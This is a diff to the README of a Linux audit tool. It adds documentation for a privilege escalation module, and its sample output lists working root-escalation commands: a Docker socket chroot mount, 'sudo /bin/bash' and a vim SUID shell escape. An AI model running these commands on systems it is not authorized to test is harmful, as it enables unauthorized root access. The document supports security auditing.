@@ -41,6 +41,7 @@
 | 🚀 **Resource Optimized** | Low CPU/memory footprint with configurable delays |
 | 🔇 **Stealth Mode** | Silent execution for security audits (`-q`) |
 | 📦 **Version Inspection** | Inventory all software versions for CVE checking (`-i`) |
+| ⚠️ **Privilege Escalation Analysis** | Smart aggregator finds 50+ exploit vectors with zero duplication |
 | 📊 **Comprehensive Reports** | Detailed findings saved to file |
 | ⚡ **Fast Mode** | Skip delays for quick scans (`-f`) |
 | 🔍 **Keyword Search** | Search configs/logs for sensitive data (`-k`) |
@@ -225,6 +226,38 @@ sudo ./Linspector.sh -t -i -r /root/complete_audit
 
 </details>
 
+<details>
+<summary><b>⚠️ Privilege Escalation Analysis (NEW!)</b></summary>
+
+**Smart Aggregator - Zero Duplication, Maximum Intelligence**
+
+Linspector includes an advanced privilege escalation module that analyzes cached enumeration data to identify exploitation paths:
+
+### Exploit Database Coverage
+- **50+ GTFOBins exploits** (vim, nmap, python, docker, systemctl, screen, tmux, etc.)
+- **18 kernel CVEs** (DirtyCOW, OverlayFS, PwnKit, DirtyPipe, Baron Samedit, etc.)
+- **Capability abuse vectors** (CAP_SETUID, CAP_DAC_READ_SEARCH, CAP_SYS_ADMIN, etc.)
+
+### Analysis Vectors
+1. **Kernel Vulnerabilities** - CVE matching + PwnKit detection
+2. **Sudo Misconfigurations** - NOPASSWD, LD_PRELOAD, environment variables, Baron Samedit
+3. **SUID Exploits** - GTFOBins database matching
+4. **Container Breakouts** - Docker group, LXD group, writable Docker socket
+5. **Capabilities** - Dangerous POSIX capabilities
+6. **PATH Hijacking** - Writable directories, current directory in PATH
+7. **Cron Job Abuse** - Writable cron files, tar wildcards
+8. **Critical Files** - Writable /etc/passwd, /etc/shadow
+9. **NFS Exports** - no_root_squash misconfigurations
+
+### Key Features
+- ✅ **Zero Duplication** - Single-pass enumeration, cached results analyzed at end
+- ✅ **Severity-Based Output** - CRITICAL → HIGH → MEDIUM prioritization
+- ✅ **Actionable Exploits** - Every finding includes exact command to execute
+- ✅ **Resource Efficient** - <5MB memory, ~2-3 second overhead
+- ✅ **CVE Intelligence** - Direct links to Exploit-DB for known vulnerabilities
+
+</details>
+
 ---
 
 ## 📊 Version Inventory Report
@@ -255,6 +288,62 @@ Use this inventory to check against CVE databases:
 - [NVD (NIST)](https://nvd.nist.gov/vuln/search)
 - [CVE Details](https://www.cvedetails.com)
 - [Exploit-DB](https://www.exploit-db.com)
+
+---
+
+## ⚠️ Privilege Escalation Summary
+
+At the end of each scan, Linspector provides a comprehensive privilege escalation analysis:
+
+```
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+         ⚠️  PRIVILEGE ESCALATION SUMMARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[*] Analyzing cached enumeration data (no additional scans)...
+
+### CRITICAL FINDINGS (Instant Root Access) ###
+
+[CRITICAL] Docker socket is writable!
+           docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+[CRITICAL] Sudo ALL commands without password
+           Command: sudo /bin/bash
+
+### HIGH PRIORITY (Reliable Exploits) ###
+
+[HIGH] Exploitable SUID: /usr/bin/vim
+       Exploit:
+       vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'
+
+[HIGH] CAP_SETUID: /usr/bin/python3.9
+       Can escalate to root UID
+
+### MEDIUM PRIORITY (May Require Conditions) ###
+
+[HIGH] Kernel Exploit: DirtyCOW (CVE-2016-5195)
+       Kernel: 2.6.32-696.el6.x86_64
+       Search: https://www.exploit-db.com/search?cve=CVE-2016-5195
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[!] Total findings: 8 potential privilege escalation vector(s)
+    Review severity levels above and test in controlled environment
+    Analysis overhead: ~2-3 seconds (aggregation only, zero rescanning)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Exploitation Resources:
+  → GTFOBins: https://gtfobins.github.io/
+  → PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+  → HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+```
+
+### What Makes It Smart?
+
+1. **Cached Analysis** - No duplicate SUID/sudo scans, analyzes data collected during enumeration
+2. **Severity Levels** - CRITICAL (instant root) → HIGH (reliable) → MEDIUM (conditional)
+3. **Actionable Commands** - Every finding includes exact exploit command
+4. **CVE Intelligence** - Kernel and sudo vulnerabilities linked to Exploit-DB
+5. **Resource Efficient** - <5MB memory overhead, ~2-3 seconds processing time
 
 ---
 
